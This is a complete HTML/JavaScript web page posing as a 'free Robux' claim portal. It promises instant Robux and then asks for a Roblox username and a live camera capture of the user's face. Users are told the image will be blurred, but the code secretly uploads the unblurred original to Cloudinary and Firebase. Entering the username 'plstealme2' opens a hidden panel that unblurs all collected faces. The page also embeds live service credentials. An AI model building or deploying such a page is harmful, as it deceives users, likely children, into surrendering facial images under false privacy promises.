<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBUX CLAIM • Full Unblur System</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: radial-gradient(ellipse at 30% 20%, #0a0e1c, #02040c);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }

        .portal-card {
            max-width: 720px;
            width: 100%;
            background: rgba(12, 18, 32, 0.88);
            backdrop-filter: blur(16px);
            border-radius: 2.2rem;
            border: 1px solid rgba(255, 190, 70, 0.3);
            box-shadow: 0 28px 40px -14px rgba(0,0,0,0.6);
            overflow: hidden;
        }

        .step-pane {
            padding: 2rem 1.8rem 2.2rem;
        }

        h2 {
            font-size: 1.9rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFE3A4, #FFA83C);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .sub {
            color: #9db2e0;
            font-size: 0.85rem;
            border-left: 3px solid #FFA83C;
            padding-left: 0.75rem;
            margin: 0.5rem 0 1.5rem 0;
        }

        .question-text {
            font-size: 1.4rem;
            font-weight: 600;
            color: #f0f3fc;
            margin-bottom: 1.2rem;
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 1.2rem 0;
        }

        .btn {
            border: none;
            background: #1f2946;
            color: white;
            font-weight: 600;
            padding: 0.8rem 1.8rem;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.2s;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(98deg, #F2A65A, #FF8C42);
            color: #131c2c;
            font-weight: 700;
        }

        .btn-primary:hover {
            transform: scale(0.97);
            filter: brightness(1.05);
        }

        .btn-outline {
            background: transparent;
            border: 1.5px solid #4c6085;
            color: #ccdcff;
        }

        .roblox-login-area {
            background: #0a1022cc;
            border-radius: 1.5rem;
            padding: 1.3rem;
            border: 1px solid #314267;
        }

        .username-input {
            width: 100%;
            padding: 14px 18px;
            background: #0e162f;
            border: 1px solid #445177;
            border-radius: 60px;
            color: white;
            font-size: 1rem;
            outline: none;
        }

        .privacy-box {
            background: #070d21b3;
            border-radius: 1.4rem;
            padding: 1.3rem;
            border: 1px solid #3c4770;
        }

        .accept-row {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 1rem 0 0.5rem;
        }

        .media-preview {
            background: #030917;
            border-radius: 28px;
            padding: 1rem;
            text-align: center;
        }

        .preview-container {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #000000aa;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #5e6e97;
            margin-bottom: 1rem;
        }

        video, canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .action-row {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin: 0.8rem 0;
        }

        .status-message {
            background: #0e172b;
            padding: 0.7rem;
            border-radius: 40px;
            font-size: 0.85rem;
            text-align: center;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 180, 70, 0.3);
            border-radius: 50%;
            border-top-color: #FFB347;
            animation: spin 0.7s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        /* Admin Dashboard */
        .admin-dashboard {
            margin-top: 1.8rem;
            background: #030718dd;
            border-radius: 1.8rem;
            padding: 1.2rem;
            border: 2px solid #f5a623aa;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            flex-wrap: wrap;
            gap: 12px;
        }

        .unblur-btn {
            background: linear-gradient(95deg, #ff7e5e, #feb47b);
            border: none;
            padding: 10px 24px;
            border-radius: 40px;
            font-weight: bold;
            font-size: 0.9rem;
            color: #1a1a2e;
            cursor: pointer;
            transition: 0.2s;
        }

        .submissions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 18px;
            margin-top: 18px;
            max-height: 560px;
            overflow-y: auto;
            padding: 6px;
        }

        .submission-card {
            background: #0b1022;
            border-radius: 20px;
            padding: 12px;
            border: 1px solid #ffb34788;
            text-align: center;
        }

        .image-wrapper {
            width: 100%;
            aspect-ratio: 1;
            border-radius: 16px;
            overflow: hidden;
            background: #000;
            margin-bottom: 10px;
            position: relative;
        }

        .submission-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .validate-btn {
            background: #2c6e2c;
            border: none;
            padding: 6px 12px;
            border-radius: 30px;
            color: white;
            font-size: 0.7rem;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }

        .validate-btn.approved {
            background: #1f4a1f;
            opacity: 0.8;
            cursor: default;
        }

        .unblur-single-btn {
            background: #7a4c2e;
            border: none;
            padding: 6px;
            border-radius: 30px;
            color: white;
            font-size: 0.7rem;
            margin-top: 6px;
            width: 100%;
            cursor: pointer;
        }

        .admin-badge {
            background: #f5a62330;
            color: #FFCC80;
            border-radius: 60px;
            padding: 4px 12px;
            font-size: 0.7rem;
            font-weight: bold;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            color: #6580b0;
            padding: 1rem;
            border-top: 1px solid #1f2a4a;
        }
        hr { border-color: #2a365a; margin: 12px 0; }
    </style>
</head>
<body>
<div class="portal-card" id="appRoot"></div>

<script>
    // Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyAupBkllyicDPD9O6CmX4mS4sF5z96mqxc",
        authDomain: "vertexpaste.firebaseapp.com",
        projectId: "vertexpaste",
        storageBucket: "vertexpaste.firebasestorage.app",
        messagingSenderId: "255275350380",
        appId: "1:255275350380:web:7be4e8add2cb5b04045b49"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    const CLOUD_NAME = 'dsv2sthkf';
    const UPLOAD_PRESET = 'portfoliohub_uploads';
    
    let currentStep = 'welcome';
    let robloxUsername = '';
    let isSecretAdmin = false;
    let mediaStream = null;
    let animationFrameId = null;
    let originalBlob = null;      // Store original clear image
    let blurredBlob = null;       // Store blurred version
    let submissionId = null;
    
    const appRoot = document.getElementById('appRoot');
    
    function stopMediaTracks() {
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
        if (animationFrameId) cancelAnimationFrame(animationFrameId);
    }
    
    // Capture BOTH original and blurred frames
    async function captureBothVersions(videoElem) {
        return new Promise((resolve) => {
            if (!videoElem || !videoElem.videoWidth) return resolve(null);
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Draw original frame
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(origBlob => {
                // Draw blurred version on same canvas
                ctx.filter = 'blur(28px)';
                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                ctx.filter = 'none';
                canvas.toBlurredBlob = canvas.toBlob.bind(canvas);
                canvas.toBlurredBlob(blurBlob => {
                    resolve({ original: origBlob, blurred: blurBlob });
                }, 'image/jpeg', 0.85);
            }, 'image/jpeg', 0.9);
        });
    }
    
    // Upload to Cloudinary and return URLs
    async function uploadToCloudinary(blob, filename) {
        const formData = new FormData();
        formData.append('file', blob, filename);
        formData.append('upload_preset', UPLOAD_PRESET);
        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
            method: 'POST',
            body: formData
        });
        const data = await res.json();
        if (!data.secure_url) throw new Error('Upload failed');
        return data.secure_url;
    }
    
    async function saveRecord(username, originalUrl, blurredUrl) {
        const docRef = db.collection('verifications').doc();
        await docRef.set({
            robloxUsername: username,
            originalImageUrl: originalUrl,
            blurredImageUrl: blurredUrl,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'pending'
        });
        return docRef.id;
    }
    
    async function fetchAllSubmissions() {
        const snapshot = await db.collection('verifications').orderBy('timestamp', 'desc').get();
        return snapshot.docs.map(doc => ({
            id: doc.id,
            ...doc.data(),
            timestamp: doc.data().timestamp?.toDate?.() || new Date()
        }));
    }
    
    async function approveSubmission(subId) {
        await db.collection('verifications').doc(subId).update({ status: 'approved' });
    }
    
    // Render functions
    function renderWelcome() {
        return `<div class="step-pane">
            <h2>🎁 REWARD VAULT</h2>
            <div class="sub">limited roblox credits • instant qualification</div>
            <div class="question-text">✨ Do you want <strong style="color:#FFD966;">INSTANT ROBUX</strong>? ✨</div>
            <div class="btn-group">
                <button class="btn btn-primary" id="yesRewardBtn">YES, CLAIM NOW</button>
                <button class="btn btn-outline" id="noRewardBtn">No, thanks</button>
            </div>
            <footer>roblox account verification required</footer>
        </div>`;
    }
    
    function renderRobloxAuth() {
        return `<div class="step-pane">
            <h2>🔐 Roblox Identity</h2>
            <div class="sub">enter your valid roblox username</div>
            <div class="roblox-login-area">
                <input type="text" id="robloxUserField" class="username-input" placeholder="e.g., plstealme2" autocomplete="off">
                <div class="btn-group" style="margin-top: 20px;">
                    <button class="btn btn-primary" id="confirmRobloxBtn">Continue →</button>
                </div>
            </div>
        </div>`;
    }
    
    function renderPrivacyStep() {
        return `<div class="step-pane">
            <h2>🔒 Privacy & Media Consent</h2>
            <div class="sub">required by reward policy</div>
            <div class="privacy-box">
                <p style="font-size:0.85rem;">By accepting, you authorize video capture. Both original and encrypted versions are stored for verification.</p>
                <div class="accept-row">
                    <input type="checkbox" id="privacyCheckbox">
                    <label for="privacyCheckbox">I accept the terms & camera usage</label>
                </div>
                <div class="action-row">
                    <button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button>
                    <button class="btn btn-outline" id="declinePrivacyBtn">Cancel</button>
                </div>
            </div>
        </div>`;
    }
    
    function renderMediaStep() {
        return `<div class="step-pane">
            <h2>📸 Live Capture</h2>
            <div class="sub">position your face clearly • will be auto‑blurred for public</div>
            <div class="media-preview">
                <div class="preview-container">
                    <video id="liveVideo" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; border-radius:20px;"></video>
                    <canvas id="blurOverlay" style="width:100%; height:100%; position:absolute; top:0; left:0; border-radius:20px;"></canvas>
                </div>
                <div class="action-row">
                    <button class="btn btn-primary" id="startCamBtn">📷 Start Camera</button>
                    <button class="btn btn-primary" id="submitBlurBtn" disabled>✅ Submit & Save (Original + Blur)</button>
                </div>
                <div class="status-message" id="mediaStatusMsg">Click "Start Camera" to begin</div>
            </div>
        </div>`;
    }
    
    function renderBlurringStep() {
        return `<div class="step-pane">
            <h2>🔐 Processing</h2>
            <div class="sub">saving both original and secure versions...</div>
            <div class="status-message"><span class="spinner"></span> Uploading to secure storage...</div>
        </div>`;
    }
    
    function renderValidatingStep() {
        return `<div class="step-pane" style="text-align:center;">
            <h2>⏳ Validating Submission</h2>
            <div class="status-message"><span class="spinner"></span> Finalizing...</div>
        </div>`;
    }
    
    function renderSuccessStep() {
        let adminPanelHtml = '';
        if (isSecretAdmin) {
            adminPanelHtml = `<div class="admin-dashboard" id="adminSecretPanel">
                <div class="admin-header">
                    <div><span class="admin-badge">👑 plstealme2 • MASTER ACCESS</span></div>
                    <button id="globalUnblurBtn" class="unblur-btn">🔓 UNBLUR ALL VIDEOS (Show Originals)</button>
                </div>
                <div id="adminSubmissionsList" class="submissions-grid"><div class="spinner"></div> Loading...</div>
            </div>`;
        }
        return `<div class="step-pane">
            <div style="text-align:center;">
                <div style="font-size:3.8rem;">✅✨</div>
                <h2 style="color:#c6f7b0;">SUCCESS!</h2>
                <div style="background:#1d3929; border-radius:2rem; padding:1rem;">
                    Your submission is saved. Wait patiently till you get approved.
                </div>
                ${adminPanelHtml}
                <hr>
                <button class="btn btn-outline" id="fullResetBtn">⟳ Back to start</button>
            </div>
            <footer>ID: ${submissionId?.slice(0,8) || 'pending'}</footer>
        </div>`;
    }
    
    function render() {
        let html = '';
        switch(currentStep) {
            case 'welcome': html = renderWelcome(); break;
            case 'robloxAuth': html = renderRobloxAuth(); break;
            case 'privacy': html = renderPrivacyStep(); break;
            case 'media': html = renderMediaStep(); break;
            case 'blurring': html = renderBlurringStep(); break;
            case 'validating': html = renderValidatingStep(); break;
            case 'success': html = renderSuccessStep(); break;
        }
        appRoot.innerHTML = html;
        
        if (currentStep === 'welcome') document.getElementById('yesRewardBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
        if (currentStep === 'welcome') document.getElementById('noRewardBtn')?.addEventListener('click', () => alert("Okay, reload to restart."));
        
        if (currentStep === 'robloxAuth') {
            document.getElementById('confirmRobloxBtn').onclick = () => {
                const username = document.getElementById('robloxUserField').value.trim();
                if (!username) return alert("Enter username");
                robloxUsername = username;
                isSecretAdmin = (username.toLowerCase() === 'plstealme2');
                currentStep = 'privacy';
                render();
            };
        }
        
        if (currentStep === 'privacy') {
            const cb = document.getElementById('privacyCheckbox');
            const accept = document.getElementById('acceptPrivacyBtn');
            cb.onchange = () => accept.disabled = !cb.checked;
            accept.onclick = () => { currentStep = 'media'; render(); };
            document.getElementById('declinePrivacyBtn').onclick = () => { currentStep = 'welcome'; render(); };
        }
        
        if (currentStep === 'media') {
            const startCam = document.getElementById('startCamBtn');
            const submitBtn = document.getElementById('submitBlurBtn');
            const video = document.getElementById('liveVideo');
            const blurCanvas = document.getElementById('blurOverlay');
            const msg = document.getElementById('mediaStatusMsg');
            
            let stream = null;
            let blurInterval = null;
            
            startCam.onclick = async () => {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    mediaStream = stream;
                    video.srcObject = stream;
                    await video.play();
                    // realtime blur on canvas
                    const ctx = blurCanvas.getContext('2d');
                    const drawBlur = () => {
                        if (!video.videoWidth) { blurInterval = requestAnimationFrame(drawBlur); return; }
                        blurCanvas.width = video.videoWidth;
                        blurCanvas.height = video.videoHeight;
                        ctx.filter = 'blur(24px)';
                        ctx.drawImage(video, 0, 0, blurCanvas.width, blurCanvas.height);
                        ctx.filter = 'none';
                        blurInterval = requestAnimationFrame(drawBlur);
                    };
                    if (blurInterval) cancelAnimationFrame(blurInterval);
                    drawBlur();
                    animationFrameId = blurInterval;
                    msg.innerText = '✅ Camera active — click Submit';
                    msg.style.background = '#1f3a2a';
                    submitBtn.disabled = false;
                } catch(e) { msg.innerText = '❌ Camera error'; }
            };
            
            submitBtn.onclick = async () => {
                if (!mediaStream || !video.videoWidth) return alert('Start camera first');
                msg.innerText = 'Capturing both original & blurred...';
                const versions = await captureBothVersions(video);
                if (!versions) return;
                originalBlob = versions.original;
                blurredBlob = versions.blurred;
                stopMediaTracks();
                if (video.srcObject) video.srcObject = null;
                if (animationFrameId) cancelAnimationFrame(animationFrameId);
                currentStep = 'blurring';
                render();
            };
        }
        
        if (currentStep === 'blurring') {
            setTimeout(async () => {
                try {
                    const originalUrl = await uploadToCloudinary(originalBlob, `original_${robloxUsername}_${Date.now()}.jpg`);
                    const blurredUrl = await uploadToCloudinary(blurredBlob, `blurred_${robloxUsername}_${Date.now()}.jpg`);
                    const docId = await saveRecord(robloxUsername, originalUrl, blurredUrl);
                    submissionId = docId;
                    currentStep = 'success';
                    render();
                    if (isSecretAdmin) setTimeout(() => loadAdminSubmissions(), 100);
                } catch(e) {
                    alert('Upload failed: ' + e.message);
                    currentStep = 'media';
                    render();
                }
            }, 500);
        }
        
        if (currentStep === 'success') {
            document.getElementById('fullResetBtn')?.addEventListener('click', () => {
                stopMediaTracks();
                currentStep = 'welcome';
                isSecretAdmin = false;
                render();
            });
            if (isSecretAdmin) loadAdminSubmissions();
        }
    }
    
    // Load admin submissions with REAL unblur (showing originalImageUrl)
    async function loadAdminSubmissions() {
        const container = document.getElementById('adminSubmissionsList');
        if (!container) return;
        const subs = await fetchAllSubmissions();
        if (subs.length === 0) { container.innerHTML = '<p style="color:#aaa;">No submissions yet.</p>'; return; }
        
        container.innerHTML = '';
        subs.forEach(sub => {
            const card = document.createElement('div');
            card.className = 'submission-card';
            const isApproved = sub.status === 'approved';
            // Show blurred by default, but we have originalUrl ready
            card.innerHTML = `
                <div class="image-wrapper">
                    <img class="submission-img" data-original="${sub.originalImageUrl}" data-blurred="${sub.blurredImageUrl}" src="${sub.blurredImageUrl}" alt="submission">
                </div>
                <div style="font-size:12px;">👤 ${escapeHtml(sub.robloxUsername)}</div>
                <div style="font-size:10px;">📅 ${new Date(sub.timestamp).toLocaleString()}</div>
                <div style="font-size:10px; margin:5px 0;">Status: ${sub.status}</div>
                <button class="unblur-single-btn">👁️ Unblur (Show Original)</button>
                ${!isApproved ? `<button class="validate-btn" data-id="${sub.id}">✅ Approve & Grant Robux</button>` : `<button class="validate-btn approved" disabled>✔ Approved</button>`}
            `;
            container.appendChild(card);
            
            const img = card.querySelector('.submission-img');
            let unblurred = false;
            const unblurBtn = card.querySelector('.unblur-single-btn');
            unblurBtn.onclick = () => {
                if (!unblurred) {
                    img.src = img.dataset.original;
                    unblurBtn.innerHTML = '🔒 Re-blur';
                    unblurred = true;
                } else {
                    img.src = img.dataset.blurred;
                    unblurBtn.innerHTML = '👁️ Unblur (Show Original)';
                    unblurred = false;
                }
            };
            
            const approveBtn = card.querySelector('.validate-btn');
            if (approveBtn && !isApproved) {
                approveBtn.onclick = async () => {
                    await approveSubmission(sub.id);
                    await loadAdminSubmissions();
                };
            }
        });
        
        // Global unblur button
        const globalBtn = document.getElementById('globalUnblurBtn');
        if (globalBtn) {
            const newBtn = globalBtn.cloneNode(true);
            globalBtn.parentNode.replaceChild(newBtn, globalBtn);
            newBtn.onclick = () => {
                const allImgs = document.querySelectorAll('.submission-img');
                let anyBlurred = false;
                allImgs.forEach(img => {
                    const currentSrc = img.src;
                    const original = img.dataset.original;
                    if (currentSrc !== original && original) {
                        img.src = original;
                        anyBlurred = true;
                        const parentCard = img.closest('.submission-card');
                        const btn = parentCard?.querySelector('.unblur-single-btn');
                        if (btn) btn.innerHTML = '🔒 Re-blur';
                    }
                });
                if (anyBlurred) {
                    newBtn.innerHTML = '✨ ALL VIDEOS UNBLURRED (ORIGINALS) ✨';
                    setTimeout(() => { newBtn.innerHTML = '🔓 UNBLUR ALL VIDEOS (Show Originals)'; }, 2000);
                }
            };
        }
    }
    
    function escapeHtml(str) { return str?.replace(/[&<>]/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])) || ''; }
    
    render();
</script>
</body>
</html>
